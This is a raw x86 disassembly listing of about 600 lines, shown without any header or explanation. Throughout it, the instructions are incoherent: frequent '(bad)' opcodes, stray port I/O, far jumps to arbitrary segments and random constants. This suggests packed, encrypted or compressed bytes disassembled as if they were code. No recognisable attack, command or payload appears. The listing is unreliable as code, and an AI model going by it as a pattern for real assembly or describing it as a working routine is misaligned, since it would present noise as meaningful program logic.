  40dc23:	ret    
  40dc24:	mov    bl,0xee
  40dc26:	sbb    al,0x80
  40dc28:	fnsave [esi]
  40dc2a:	pop    es
  40dc2b:	(bad)  
  40dc2c:	mov    bh,BYTE PTR [edi+ebx*2-0x11]
  40dc30:	not    DWORD PTR [edx]
  40dc32:	cdq    
  40dc33:	push   ds
  40dc34:	pushf  
  40dc35:	in     al,dx
  40dc36:	(bad)  
  40dc37:	lock push eax
  40dc39:	pop    es
  40dc3a:	fiadd  DWORD PTR [edx-0x2601940d]
  40dc40:	cmp    ebp,esi
  40dc42:	dec    ebp
  40dc43:	mov    es,esp
  40dc45:	xor    eax,0x9504cd03
  40dc4a:	(bad)  
  40dc4b:	pop    esp
  40dc4c:	hlt    
  40dc4d:	(bad)  
  40dc4e:	(bad)  
  40dc4f:	adc    ebx,DWORD PTR [ebp+0x58]
  40dc52:	(bad)  
  40dc53:	je     0x40dbfa
  40dc55:	pop    esp
  40dc56:	imul   edi
  40dc58:	xchg   BYTE PTR fs:[ecx-0x6e6b7da0],al
  40dc5f:	push   edi
  40dc60:	(bad)  
  40dc61:	out    dx,eax
  40dc62:	dec    esi
  40dc63:	jb     0x40dcd1
  40dc65:	xchg   esp,eax
  40dc66:	pop    esi
  40dc67:	pop    eax
  40dc68:	pop    ebx
  40dc69:	or     eax,0x65956200
  40dc6e:	mov    edi,0xde0f18d3
  40dc73:	push   ecx
  40dc74:	(bad)  [esi]
  40dc76:	jbe    0x40dc66
  40dc78:	push   ss
  40dc79:	pop    ds
  40dc7a:	loop   0x40dc06
  40dc7c:	jnp    0x40dc57
  40dc7e:	mov    ?,WORD PTR [edi+eiz*1+0x71]
  40dc82:	push   edi
  40dc83:	pop    eax
  40dc84:	sbb    eax,0x18bdae86
  40dc89:	sti    
  40dc8a:	imul   DWORD PTR [ebx]
  40dc8c:	mov    bl,0x28
  40dc8e:	les    ebp,FWORD PTR ds:0x4500160f
  40dc94:	jo     0x40dd00
  40dc96:	xchg   esp,eax
  40dc97:	cmp    BYTE PTR [ebp+0x5e],dh
  40dc9a:	mov    dh,0xda
  40dc9c:	pop    DWORD PTR [ebx+0x13]
  40dc9f:	cmp    DWORD PTR [ecx+0x1426fc40],edx
  40dca5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dca6:	(bad)  
  40dca7:	jne    0x889b17c6
  40dcad:	test   edi,0x2544037f
  40dcb3:	mov    ecx,0x969a3e34
  40dcb8:	lods   al,BYTE PTR ds:[esi]
  40dcb9:	dec    edi
  40dcba:	shl    BYTE PTR [ebp-0x289e456],1
  40dcc0:	push   ss
  40dcc1:	out    dx,al
  40dcc2:	add    esi,DWORD PTR [eax-0x27]
  40dcc5:	adc    ebx,DWORD PTR [esi-0x17]
  40dcc8:	xor    BYTE PTR [esi-0x49],dh
  40dccb:	or     BYTE PTR [esi+0x30e56238],dh
  40dcd1:	aam    0x7e
  40dcd3:	sub    esi,DWORD PTR [ebx]
  40dcd5:	xor    al,0x1c
  40dcd7:	or     ebp,DWORD PTR [ebp+0x29adf871]
  40dcdd:	push   ecx
  40dcde:	sbb    eax,0x8fb5981
  40dce3:	mov    ecx,0xe92270dc
  40dce8:	mov    eax,ds:0xa2f145e
  40dced:	inc    ecx
  40dcee:	into   
  40dcef:	mov    ecx,0x8841737c
  40dcf4:	imul   edi,DWORD PTR [edx-0x75],0x50b00efb
  40dcfb:	or     al,0x54
  40dcfd:	pop    ebp
  40dcfe:	dec    esp
  40dcff:	inc    ebp
  40dd00:	xchg   BYTE PTR [eax-0x78354799],dl
  40dd06:	retw   0xc71d
  40dd0a:	or     eax,0xa7f4fa5d
  40dd0f:	div    ebx
  40dd11:	add    esp,0x4b35a500
  40dd17:	jbe    0x40dccc
  40dd19:	fnclex 
  40dd1b:	mov    ds:0x2036cc86,al
  40dd20:	or     eax,0xfe5c74a4
  40dd25:	lds    esi,FWORD PTR [edi-0x5c65563f]
  40dd2b:	cwde   
  40dd2c:	push   edi
  40dd2d:	xchg   esp,eax
  40dd2e:	lds    ebp,FWORD PTR [edi-0x1e]
  40dd31:	mov    bh,0xfb
  40dd33:	loopne 0x40dce1
  40dd35:	xor    ch,cl
  40dd37:	out    0xdb,al
  40dd39:	cmc    
  40dd3a:	lds    esi,FWORD PTR [edi]
  40dd3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dd3d:	inc    eax
  40dd3e:	ret    
  40dd3f:	dec    ebp
  40dd40:	cwde   
  40dd41:	popf   
  40dd42:	nop
  40dd43:	or     cl,BYTE PTR [edi]
  40dd45:	and    BYTE PTR [edx+eiz*4],ch
  40dd48:	test   BYTE PTR [ebx],dl
  40dd4a:	cmp    dh,BYTE PTR [ecx-0x31]
  40dd4d:	fldcw  WORD PTR [esi-0x2cefae10]
  40dd53:	pop    ebx
  40dd54:	lahf   
  40dd55:	test   edx,ecx
  40dd57:	push   ds
  40dd58:	mov    DWORD PTR [eax],esi
  40dd5a:	inc    esi
  40dd5b:	sub    BYTE PTR [ecx-0x39812b1],0x80
  40dd62:	cli    
  40dd63:	inc    eax
  40dd64:	dec    ebp
  40dd65:	fisttp WORD PTR [esi-0x26]
  40dd68:	dec    esi
  40dd69:	imul   esp,DWORD PTR [ebp-0x9],0xffffff9e
  40dd6d:	cs call 0x3b6d8ca6
  40dd73:	sub    al,0x39
  40dd75:	inc    esp
  40dd76:	neg    BYTE PTR [edx+0x5d]
  40dd79:	shl    DWORD PTR [ecx],cl
  40dd7b:	push   ecx
  40dd7c:	add    eax,0x75e734a8
  40dd81:	mov    BYTE PTR [edi],dl
  40dd83:	adc    ah,bl
  40dd85:	jp     0x40dd6e
  40dd87:	pop    ebx
  40dd88:	in     eax,0xfe
  40dd8a:	pusha  
  40dd8b:	jb     0x40ddec
  40dd8d:	gs in  eax,0x9c
  40dd90:	ja     0x40dd73
  40dd92:	cmp    al,0x9f
  40dd95:	xchg   DWORD PTR [edi],esp
  40dd97:	das    
  40dd98:	outs   dx,DWORD PTR ds:[esi]
  40dd99:	mov    dh,0x8e
  40dd9b:	pop    eax
  40dd9c:	mov    ds,WORD PTR [edi]
  40dd9e:	or     al,0x85
  40dda0:	sbb    DWORD PTR [eax-0x30],0xffffffb1
  40dda4:	sti    
  40dda5:	push   cs
  40dda6:	jmp    0xc38c:0xbf0e7f0
  40ddad:	stos   DWORD PTR es:[edi],eax
  40ddae:	call   0x1fb7:0x3ac7d2bc
  40ddb5:	test   eax,0xd59622d4
  40ddba:	(bad)  
  40ddbc:	xchg   ebx,eax
  40ddbd:	hlt    
  40ddbe:	adc    al,0x80
  40ddc0:	mov    ds:0x382a0412,eax
  40ddc5:	add    eax,0xd8d6284c
  40ddca:	sbb    DWORD PTR [edx+0x33],ebx
  40ddcd:	cmp    DWORD PTR [ecx+0x741a4ca6],eax
  40ddd3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ddd4:	add    dh,BYTE PTR [ebx-0x620ca9d0]
  40ddda:	cld    
  40dddb:	cmp    BYTE PTR [edi+0xa],ch
  40ddde:	fsubrp st(4),st
  40dde0:	inc    edi
  40dde1:	and    bl,BYTE PTR [edx]
  40dde3:	ror    ch,1
  40dde5:	out    dx,al
  40dde6:	mov    al,0x80
  40dde8:	and    bh,BYTE PTR [edx+eax*8]
  40ddeb:	sbb    eax,0x1f3e709d
  40ddf0:	out    0x6c,eax
  40ddf2:	sbb    al,0x41
  40ddf4:	fs out 0xd4,eax
  40ddf7:	push   DWORD PTR [esi]
  40ddf9:	or     esi,DWORD PTR [ecx+0x25]
  40ddfc:	sub    dh,BYTE PTR [ebx]
  40ddfe:	jle    0x40dd8e
  40de00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40de01:	cmp    esi,DWORD PTR [ecx+0x2450a4a1]
  40de07:	lock rcl ebp,cl
  40de0a:	cmp    dl,BYTE PTR ds:0xb4bb2ad1
  40de10:	or     al,0x8c
  40de12:	add    eax,0x27521a3f
  40de17:	int3   
  40de18:	daa    
  40de19:	in     al,0xd2
  40de1b:	pop    edi
  40de1c:	pop    esp
  40de1d:	cdq    
  40de1e:	dec    ebx
  40de1f:	jno    0x40ddbd
  40de21:	mov    esp,0x3961cfb6
  40de26:	mov    edi,0x562357fc
  40de2b:	mov    gs,WORD PTR [esi+0x18acc16d]
  40de31:	xor    DWORD PTR [ebx],ebx
  40de33:	pop    edx
  40de34:	sbb    dh,ah
  40de36:	push   0x0
  40de38:	push   esp
  40de39:	and    dh,BYTE PTR [eax]
  40de3b:	and    BYTE PTR [eax+edi*4+0x1d],dl
  40de3f:	retf   
  40de40:	sahf   
  40de41:	sub    al,0x38
  40de43:	int    0x5b
  40de45:	cdq    
  40de46:	dec    esi
  40de47:	xor    al,0xf4
  40de49:	ins    BYTE PTR es:[edi],dx
  40de4a:	das    
  40de4b:	std    
  40de4c:	push   eax
  40de4d:	xor    eax,DWORD PTR [esp+eax*8+0x3f]
  40de51:	sub    DWORD PTR [eax],ebp
  40de53:	pusha  
  40de54:	fdiv   QWORD PTR [eax]
  40de56:	xchg   ebx,eax
  40de57:	jmp    0xb64263d6
  40de5c:	jmp    0xb4d14f3b
  40de61:	sbb    BYTE PTR [edi+0x4b33d833],ah
  40de67:	mov    cl,0xf2
  40de69:	inc    ebp
  40de6a:	(bad)  
  40de6c:	in     al,0x39
  40de6e:	cmp    DWORD PTR [eax+0x535d9256],ebp
  40de74:	lds    ecx,FWORD PTR [esi+0x297ccdf7]
  40de7a:	xchg   edx,eax
  40de7b:	pop    ebp
  40de7c:	mov    ecx,0x6c330946
  40de81:	mov    gs,WORD PTR [edx-0x5b]
  40de84:	jecxz  0x40de39
  40de86:	jbe    0x40de1e
  40de88:	mov    ds:0x1fd7873e,al
  40de8d:	inc    edx
  40de8e:	and    esi,DWORD PTR [edx+ebp*2+0xe554c16]
  40de95:	adc    esp,DWORD PTR [eax+esi*2+0x22]
  40de99:	xchg   ecx,eax
  40de9a:	add    BYTE PTR [ebx+0x3f],dl
  40de9d:	js     0x40de55
  40de9f:	jmp    0x40de86
  40dea1:	xor    dl,BYTE PTR [ebx+0x57]
  40dea4:	jno    0x40de63
  40dea6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dea7:	sti    
  40dea8:	xchg   BYTE PTR [ebx+eiz*2],cl
  40deab:	inc    ebp
  40deac:	xor    esp,ebx
  40deae:	mov    eax,0x975f6adb
  40deb3:	ss daa 
  40deb5:	and    bl,BYTE PTR [edi-0x4c36da74]
  40debb:	mov    eax,0xfd64b5e3
  40dec0:	sahf   
  40dec1:	ins    BYTE PTR es:[edi],dx
  40dec2:	pop    ss
  40dec3:	add    al,0xef
  40dec5:	das    
  40dec6:	std    
  40dec7:	popf   
  40dec8:	(bad)  
  40dec9:	gs popa 
  40decb:	es jmp 0x29b1:0xd10d8212
  40ded3:	add    eax,0xcfb59294
  40ded8:	inc    eax
  40ded9:	fistp  QWORD PTR [edx]
  40dedb:	mov    WORD PTR [ecx-0xc],ss
  40dede:	cld    
  40dedf:	aaa    
  40dee0:	lahf   
  40dee1:	icebp  
  40dee2:	popa   
  40dee3:	faddp  st(0),st
  40dee5:	js     0x40df1e
  40dee7:	neg    DWORD PTR [ebp+0x3a744068]
  40deed:	cs jle 0x40de7e
  40def0:	clc    
  40def1:	in     al,0x32
  40def3:	(bad)
  40def6:	lods   al,BYTE PTR ds:[esi]
  40def7:	pushf  
  40def8:	jecxz  0x40df58
  40defa:	scas   eax,DWORD PTR es:[edi]
  40defb:	or     eax,0x9d667b56
  40df00:	jmp    0xaa9e:0xe9eac6d4
  40df07:	mov    eax,ds:0xeb5a9c61
  40df0c:	loop   0x40deaa
  40df0e:	mov    al,0x71
  40df10:	(bad)  
  40df11:	(bad)  
  40df12:	out    0x1a,al
  40df14:	ficom  DWORD PTR [eax-0x40d0ada2]
  40df1a:	adc    DWORD PTR [ebx],ecx
  40df1c:	jmp    0x40deac
  40df1e:	xlat   BYTE PTR ds:[ebx]
  40df1f:	scas   al,BYTE PTR es:[edi]
  40df20:	enter  0x1458,0x5f
  40df24:	addr16 dec ebx
  40df26:	sub    DWORD PTR [ebx-0x1ca487b5],edi
  40df2c:	sub    eax,DWORD PTR [eax-0x16]
  40df2f:	mov    edx,0x9c5dc900
  40df34:	ror    DWORD PTR [ecx+0x27ad4f75],cl
  40df3a:	stos   DWORD PTR es:[edi],eax
  40df3b:	add    bh,BYTE PTR [eax]
  40df3d:	mov    gs,WORD PTR [ebx+0x2129972]
  40df43:	addr16 je 0x40df54
  40df46:	add    BYTE PTR [eax-0x21754e96],dh
  40df4c:	mov    ds:0xb5b9b0d0,eax
  40df52:	fisttp QWORD PTR [edx+0x104f32ae]
  40df58:	sbb    ecx,eax
  40df5a:	bound  ebp,QWORD PTR [ebx+0x2f6a4a82]
  40df60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40df61:	or     edi,DWORD PTR ds:0x43437dc9
  40df67:	cmp    ch,dl
  40df69:	jmp    0x40deec
  40df6b:	rcr    BYTE PTR [esi-0x64],cl
  40df6e:	or     ecx,ecx
  40df70:	xchg   esp,eax
  40df71:	mov    ecx,0x6d004e13
  40df76:	or     eax,0x4b0163c0
  40df7b:	cli    
  40df7c:	pop    esi
  40df7d:	dec    esp
  40df7e:	mov    ah,0xef
  40df80:	push   eax
  40df81:	popa   
  40df82:	dec    esi
  40df83:	adc    eax,0x94dd244f
  40df88:	repnz shl BYTE PTR [edx+0x5e],0x8b
  40df8d:	add    al,0x55
  40df8f:	or     al,0x9f
  40df91:	inc    edx
  40df92:	cmc    
  40df93:	mov    ds:0xc93b0494,eax
  40df98:	out    dx,eax
  40df99:	cmp    edx,DWORD PTR [esi+0xb67325e]
  40df9f:	out    0x9b,eax
  40dfa1:	call   0x144a9f8f
  40dfa6:	add    eax,0x3c0ca89a
  40dfab:	lock or esi,DWORD PTR [ebx+0x65]
  40dfaf:	hlt    
  40dfb0:	sub    al,0xf
  40dfb2:	ds (bad) 
  40dfb4:	(bad)  
  40dfb5:	push   0xffffffda
  40dfb7:	mov    dh,0x39
  40dfb9:	fwait
  40dfba:	or     BYTE PTR [ecx+ebx*2-0x1dcc08e5],al
  40dfc1:	mov    ds:0x414aeee6,al
  40dfc6:	dec    eax
  40dfc7:	add    cl,ah
  40dfc9:	fldenv [edx-0x928850]
  40dfcf:	xor    esp,DWORD PTR [edx]
  40dfd1:	ja     0x40e04a
  40dfd3:	mov    edi,0x62f0811c
  40dfd8:	retf   0x684c
  40dfdb:	(bad)  [edi-0x3eaf9b0d]
  40dfe1:	mov    bh,0xfb
  40dfe3:	push   ecx
  40dfe4:	and    edx,DWORD PTR [ebp+0x4c01e6b8]
  40dfea:	sahf   
  40dfeb:	into   
  40dfec:	repnz push ds
  40dfee:	rcl    ecx,cl
  40dff0:	fs (bad) 
  40dff2:	push   edx
  40dff3:	jg     0x40dfe5
  40dff5:	push   edi
  40dff6:	les    edi,FWORD PTR es:[esi]
  40dff9:	mov    ds:0x125cb0ca,al
  40dffe:	and    eax,0x2c216de3
  40e003:	cmp    DWORD PTR [ecx],esi
  40e005:	inc    esi
  40e006:	sbb    eax,0xdb3e50cf
  40e00b:	lock fs and dl,cl
  40e00f:	adc    edx,DWORD PTR [ebp+0x3d]
  40e012:	scas   al,BYTE PTR es:[edi]
  40e013:	xor    BYTE PTR [edi],0x42
  40e016:	daa    
  40e017:	push   edi
  40e018:	imul   esp,DWORD PTR [edi+ebp*4-0x1d],0xf
  40e01d:	out    0xe4,al
  40e01f:	std    
  40e020:	repz fdivr QWORD PTR [ebx-0x2da93e84]
  40e027:	aaa    
  40e028:	mul    cl
  40e02a:	lock or BYTE PTR [edx],al
  40e02d:	jo     0x40dfde
  40e02f:	adc    ah,al
  40e031:	jge    0x40e051
  40e033:	xor    ebp,DWORD PTR [edx+0x6d8a3aa5]
  40e039:	adc    eax,0x3b345ea1
  40e03e:	dec    esp
  40e03f:	aas    
  40e040:	aas    
  40e041:	jno    0x40e01a
  40e043:	and    DWORD PTR [esi+0x3f],ebx
  40e046:	repz add ebx,DWORD PTR [edi+0x70]
  40e04a:	leave  
  40e04b:	jae    0x40e0bf
  40e04d:	adc    eax,0x67604e88
  40e052:	jno    0x40e086
  40e054:	call   0x9728:0xdcb95ac7
  40e05b:	(bad)  
  40e05c:	enter  0xe434,0x1a
  40e060:	push   ebp
  40e061:	pop    esi
  40e062:	jmp    0xb70c8cf9
  40e067:	mov    bh,0xde
  40e069:	test   BYTE PTR [esi-0x13c64a6a],bl
  40e06f:	push   0xd00aca96
  40e074:	ror    dl,0xd9
  40e077:	mov    cl,0x3d
  40e079:	cs pushf 
  40e07b:	mov    bl,0x98
  40e07d:	xchg   esi,ecx
  40e07f:	dec    esp
  40e080:	es mov edx,esp
  40e083:	out    dx,eax
  40e084:	xor    BYTE PTR [esi],ah
  40e086:	mov    ecx,0x88698d1
  40e08b:	in     eax,dx
  40e08c:	int3   
  40e08d:	std    
  40e08e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e08f:	outs   dx,DWORD PTR ds:[esi]
  40e090:	cmp    eax,0xe70847bb
  40e095:	sub    ch,bl
  40e097:	sbb    BYTE PTR [eax-0xc],bl
  40e09a:	rol    BYTE PTR [eax],1
  40e09c:	imul   esp,DWORD PTR [eax-0x4b0d1d26],0x673919f8
  40e0a6:	mov    bl,0xe6
  40e0a8:	cmp    al,0x27
  40e0aa:	mov    esp,DWORD PTR [esi-0x2c797dab]
  40e0b0:	mov    edi,0x2c93be0c
  40e0b5:	sub    esi,ebx
  40e0b7:	adc    esi,DWORD PTR [esi]
  40e0b9:	dec    eax
  40e0ba:	pop    ebp
  40e0bb:	lods   eax,DWORD PTR ds:[esi]
  40e0bc:	stos   DWORD PTR es:[edi],eax
  40e0bd:	push   edi
  40e0be:	popa   
  40e0bf:	mov    dl,0x3c
  40e0c1:	jmp    0x40e076
  40e0c3:	mov    al,0xef
  40e0c5:	mov    ecx,0x615881b2
  40e0ca:	arpl   WORD PTR [ecx],bx
  40e0cc:	sbb    cl,BYTE PTR [ebx+0x3aa8272b]
  40e0d2:	ret    
  40e0d3:	pop    edx
  40e0d4:	lahf   
  40e0d5:	and    ecx,eax
  40e0d7:	fbstp  TBYTE PTR [ebp+0x79]
  40e0da:	ret    
  40e0db:	cmc    
  40e0dc:	mov    edx,0xbc90cf10
  40e0e1:	mov    esp,0x3802feff
  40e0e6:	push   es
  40e0e7:	add    edx,DWORD PTR [ecx-0x42]
  40e0ea:	scas   eax,DWORD PTR es:[edi]
  40e0eb:	test   eax,0x2be946a0
  40e0f0:	or     esp,eax
  40e0f2:	or     cl,BYTE PTR [edi-0x40]
  40e0f5:	xor    edx,DWORD PTR [esi+0x9]
  40e0f8:	jmp    0xdb46:0x3d65eef
  40e0ff:	xchg   eax,ecx
  40e101:	pusha  
  40e102:	push   0xada87164
  40e107:	pop    esi
  40e108:	mov    eax,0x89f4b16e
  40e10d:	xchg   DWORD PTR [edi+0x49],ebx
  40e110:	sub    BYTE PTR [edx-0x1f38445d],al
  40e116:	in     al,0x7a
  40e118:	fst    QWORD PTR [eax-0x49]
  40e11b:	push   ss
  40e11c:	push   ecx
  40e11d:	gs mov ebx,0x6a24e2d7
  40e123:	adc    DWORD PTR [eax-0x6f],edx
  40e126:	stc    
  40e127:	sub    BYTE PTR [edi+ecx*2+0x7065b019],dh
  40e12e:	std    
  40e12f:	mov    bh,ch
  40e131:	mov    ds:0xe40b5352,eax
  40e136:	rcr    BYTE PTR [esi+ecx*2-0x10159c65],0x23
  40e13e:	out    0xdf,al
  40e140:	ret    
  40e141:	stos   DWORD PTR es:[edi],eax
  40e142:	inc    edx
  40e143:	es or  eax,0x34578b55
  40e149:	mov    ?,esp
  40e14b:	push   esi
  40e14c:	jno    0x40e146
  40e14e:	test   al,0xf7
  40e150:	push   ebx
  40e151:	ds out dx,eax
  40e153:	push   ecx
  40e154:	sti    
  40e155:	in     al,0xa6
  40e157:	retf   
  40e158:	push   ebp
  40e159:	fsub   DWORD PTR [esi]
  40e15b:	sbb    DWORD PTR [esi+ebx*4-0x21],esi
  40e15f:	mov    WORD PTR [eax+edi*8-0x2b89d514],?
  40e166:	mov    cl,0x87
  40e168:	xor    al,0x3b
  40e16a:	adc    bl,BYTE PTR [ecx+0x2a]
  40e16d:	jg     0x40e1e6
  40e16f:	outs   dx,BYTE PTR ds:[esi]
  40e170:	dec    ecx
  40e171:	js     0x40e199
  40e173:	pop    edx
  40e174:	adc    ch,BYTE PTR [eax-0x70]
  40e177:	sar    BYTE PTR [eax+0x61d7db08],cl
  40e17d:	sbb    BYTE PTR [edi-0xa],dl
  40e180:	cdq    
  40e181:	fisubr DWORD PTR [ebp-0x15]
  40e184:	loope  0x40e1b0
  40e186:	xor    al,0xa9
  40e188:	icebp  
  40e189:	das    
  40e18a:	or     eax,0x8eaf6cd4
  40e18f:	addr16 xchg esi,eax
  40e191:	mov    al,ds:0x5268d27d
  40e196:	xchg   BYTE PTR [ecx+0x5fa74193],dh
  40e19c:	sbb    eax,0x1923aa9b
  40e1a1:	inc    ebx
  40e1a2:	ins    DWORD PTR es:[edi],dx
  40e1a3:	jmp    0xef81f1d2
  40e1a8:	inc    ebx
  40e1a9:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  40e1ab:	clc    
  40e1ac:	ins    DWORD PTR es:[edi],dx
  40e1ad:	loopne 0x40e17b
  40e1af:	aaa    
  40e1b0:	jae    0x40e15f
  40e1b2:	add    al,0x19
  40e1b4:	mov    al,ds:0xda91dade
  40e1b9:	and    eax,edx
  40e1bb:	jns    0x40e195
  40e1bd:	mov    bl,0x89
  40e1bf:	iret   
  40e1c0:	xor    eax,0xe0c19e68
  40e1c5:	iret   
  40e1c6:	pop    esi
  40e1c7:	xchg   edx,eax
  40e1c8:	add    eax,0x42609176
  40e1cd:	leave  
  40e1ce:	sbb    esi,DWORD PTR [ebx-0x705759de]
  40e1d4:	sub    BYTE PTR [ebp-0x6e102a09],cl
  40e1da:	movd   ecx,mm7
  40e1dd:	not    dh
  40e1df:	jne    0x40e17e
  40e1e1:	xchg   edx,eax
  40e1e2:	scas   al,BYTE PTR es:[edi]
  40e1e3:	stc    
  40e1e4:	sub    BYTE PTR [ebx],dh
  40e1e6:	sub    dl,BYTE PTR [edi]
  40e1e8:	mov    ?,WORD PTR [ecx+0x5c]
  40e1eb:	inc    ebx
  40e1ec:	fsubr  st,st(2)
  40e1ee:	in     al,0x93
  40e1f0:	ins    BYTE PTR es:[edi],dx
  40e1f1:	out    dx,eax
  40e1f2:	or     eax,0x7f3704bb
  40e1f7:	jge    0x40e256
  40e1f9:	and    bh,bl
  40e1fb:	push   cs
  40e1fc:	jmp    0x40e204
  40e1fe:	mov    gs,WORD PTR [ecx]
  40e200:	mov    eax,ds:0x614f8587
  40e205:	pop    ss
  40e206:	cmp    ch,bh
  40e208:	popa   
  40e209:	sub    DWORD PTR [ecx+esi*2-0x26],0x22a0dd2b
  40e211:	outs   dx,DWORD PTR ds:[esi]
  40e212:	mov    BYTE PTR [ebx-0x66],bl
  40e215:	stos   DWORD PTR es:[edi],eax
  40e216:	in     eax,dx
  40e217:	ds fwait
  40e219:	jecxz  0x40e215
  40e21b:	and    al,0x12
  40e21d:	in     eax,0x8f
  40e21f:	test   edi,ebx
  40e221:	mov    eax,0x9505f6b4
  40e226:	and    ebp,DWORD PTR [edx-0x72]
  40e229:	lods   al,BYTE PTR ds:[esi]
  40e22a:	popf   
  40e22b:	aas    
  40e22c:	(bad)  
  40e22d:	or     al,0x74
  40e22f:	jecxz  0x40e20a
  40e231:	ss xor al,0x6f
  40e234:	inc    edx
  40e235:	push   esi
  40e236:	or     al,0xb9
  40e238:	mov    edx,0x2a897cc7
  40e23d:	pop    es
  40e23e:	xchg   ecx,eax
  40e23f:	and    al,0xcb
  40e241:	push   ss
  40e242:	mov    edx,0x701f58f6
  40e247:	arpl   WORD PTR [esi],si
  40e249:	pop    eax
  40e24a:	imul   edx,DWORD PTR [eax-0x1f7006a3],0xffffffa5
  40e251:	dec    eax
  40e252:	cmp    DWORD PTR [edi+0x68b2355a],0x2c
  40e259:	add    al,dh
  40e25b:	daa    
  40e25c:	sub    al,0xed
  40e25e:	sahf   
  40e25f:	xlat   BYTE PTR ds:[ebx]
  40e260:	pop    ecx
  40e261:	jecxz  0x40e205
  40e263:	sbb    DWORD PTR [ebp-0x7],edx
  40e266:	push   eax
  40e267:	xlat   BYTE PTR ds:[ebx]
  40e268:	rcr    DWORD PTR [ebp+0x1ad97e9],cl
  40e26e:	push   es
  40e26f:	push   edi
  40e270:	mov    dh,0x77
  40e272:	xchg   ecx,eax
  40e273:	pop    ecx
  40e274:	or     BYTE PTR ds:0xd404867c,bh
  40e27a:	(bad)  
  40e27c:	stos   BYTE PTR es:[edi],al
  40e27d:	ins    BYTE PTR es:[edi],dx
  40e27e:	push   es
  40e27f:	mov    DWORD PTR [edi],ebp
  40e281:	push   esi
  40e282:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e283:	mov    ecx,0x2e09ca50
  40e288:	aam    0x3f
  40e28a:	dec    eax
  40e28b:	call   0x6dea7014
  40e290:	xor    al,BYTE PTR [eax+0x5048923b]
  40e296:	pop    ecx
  40e297:	xchg   edi,eax
  40e298:	or     eax,DWORD PTR [eax+eax*1+0x49]
  40e29c:	cmc    
  40e29d:	adc    eax,0xbeafd087
  40e2a2:	rcl    DWORD PTR [ebx+0x42],1
  40e2a5:	mov    al,ds:0x38229088
  40e2aa:	int    0x1f
  40e2ac:	js     0x40e2b3
  40e2ae:	ret    0xa6ce
  40e2b1:	xchg   BYTE PTR [ebp-0x1f],ah
  40e2b4:	retf   0xd2
  40e2b7:	dec    ebp
  40e2b8:	xor    ebp,DWORD PTR [edx+0x25]
  40e2bb:	test   al,0xf4
  40e2bd:	stos   DWORD PTR es:[edi],eax
  40e2be:	adc    ah,BYTE PTR [ebp+0x73]
  40e2c1:	aas    
  40e2c2:	mov    esp,0x595caf42
  40e2c7:	je     0x40e298
  40e2c9:	xlat   BYTE PTR ds:[ebx]
  40e2ca:	mov    dl,0x39
  40e2cc:	push   0xe2d5a93d
  40e2d1:	or     BYTE PTR [edx-0xd],ch
  40e2d4:	add    cl,ah
  40e2d6:	gs sbb al,0x87
  40e2d9:	push   ebx
  40e2da:	and    esp,DWORD PTR [ecx+0x6c]
  40e2dd:	jmp    0x8146:0x1ef26bbc
  40e2e4:	xchg   ebx,eax
  40e2e5:	xor    DWORD PTR [eax+edx*4],edx
  40e2e8:	pop    edx
  40e2e9:	push   ecx
  40e2ea:	jmp    0xa39fdbc4
  40e2ef:	test   al,0x17
  40e2f1:	(bad)  
  40e2f2:	xor    DWORD PTR [eax-0x48367f9d],ebp
  40e2f8:	sub    eax,0xaa9ed836
  40e2fd:	repnz bound ebp,QWORD PTR [ebp-0x42]
  40e301:	push   ebp
  40e302:	sbb    ecx,DWORD PTR [esi+0x43]
  40e305:	clc    
  40e306:	int3   
  40e307:	inc    ebx
  40e308:	sbb    bh,dh
  40e30a:	jmp    0xf74b:0x296e977a
  40e311:	add    DWORD PTR [esi+0x6ad4dc07],esi
  40e317:	ret    0xa31d
  40e31a:	push   0x6f
  40e31c:	jno    0x40e2c8
  40e31e:	or     eax,0x51b521a4
  40e323:	(bad)  
  40e324:	mov    ebx,0x4c5c6555
  40e329:	lea    edi,[ecx+0x539147a9]
  40e32f:	cmp    bh,dh
  40e331:	sti    
  40e332:	iret   
  40e333:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e334:	mov    ebp,0xdbae61e0
  40e339:	mov    ds:0x9dfdaf5d,al
  40e33e:	outs   dx,BYTE PTR ds:[esi]
  40e33f:	mov    bh,0xeb
  40e341:	(bad)  
  40e342:	sar    BYTE PTR [esi-0x7],1
  40e345:	mov    cs,WORD PTR [esi]
  40e347:	xor    ebp,DWORD PTR [edi+0x1143cc14]
  40e34d:	and    esp,DWORD PTR [ebx-0x2688ab0b]
  40e353:	xor    DWORD PTR [ebx+0x1dfebfcb],0x7c
  40e35a:	push   es
  40e35b:	dec    ebx
  40e35c:	leave  
  40e35d:	add    DWORD PTR [edx+0xc],0xffffffc2
  40e361:	lods   eax,DWORD PTR ds:[esi]
  40e362:	add    eax,0xee169161
  40e367:	lods   al,BYTE PTR ds:[esi]
  40e368:	fadd   DWORD PTR [ebp+esi*8+0x31]
  40e36c:	daa    
  40e36d:	xchg   esp,eax
  40e36f:	or     ah,ch
  40e371:	in     al,dx
  40e372:	mov    al,0x41
  40e374:	dec    esi
  40e375:	gs (bad) 
  40e377:	pop    esp
  40e378:	imul   ebx
  40e37a:	test   DWORD PTR [eax],0xad4848c5
  40e380:	fisubr WORD PTR [ecx]
  40e382:	jb     0x40e34f
  40e384:	sub    DWORD PTR [ecx+ebx*8-0x500723a3],0xfda4bdd0
  40e38f:	cli    
  40e390:	jecxz  0x40e3b3
  40e392:	jge    0x40e349
  40e394:	fsub   DWORD PTR [eax+0x4a]
  40e397:	pop    eax
  40e398:	push   ebx
  40e399:	test   DWORD PTR [ebx],ebp
  40e39b:	xor    BYTE PTR [ebp-0x41],bl
  40e39e:	ins    DWORD PTR es:[edi],dx
  40e39f:	dec    ebx
  40e3a0:	rcr    edi,0x56
  40e3a3:	sbb    eax,0xfec5107e
  40e3a8:	inc    esp
  40e3a9:	outs   dx,BYTE PTR ds:[esi]
  40e3aa:	mov    WORD PTR [ebx-0x79c5bb2a],gs
  40e3b0:	or     eax,0xc18f0a7b
  40e3b5:	cmp    ch,0xc4
  40e3b8:	rcl    DWORD PTR [ebx],0x25
  40e3bb:	iret   
